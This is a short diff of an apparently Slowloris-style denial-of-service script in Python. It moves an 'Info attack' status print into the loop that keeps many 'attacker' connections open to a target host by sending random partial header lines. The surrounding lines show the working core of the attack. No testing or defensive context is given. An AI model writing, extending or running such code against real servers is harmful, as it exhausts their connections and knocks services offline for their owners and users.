@@ -89,7 +89,7 @@ def main():
     logging.info("Attacking {} with {} attackers".format(host, connections))  
     logging.info("Establishing connections..")
     attackers = []
-    print("\033[48;5;7m\033[38;5;0mInfo attack\033[0m \033[38;5;2mid{} ")
+    
     
 
     for x in range((connections)):
@@ -101,6 +101,7 @@ def main():
     while True:
         try:
             logging.info("Keeping {} attacker connections alive.. ".format(len(attackers)))
+            print("\033[48;5;7m\033[38;5;0mInfo attack\033[0m \033[38;5;2m"+id+" ")
             for s in list(attackers):
                 try:
                     s.socket.send("X-{}: {}\r\n".format(randint(0, 50000), randint(0, 50000)).encode())
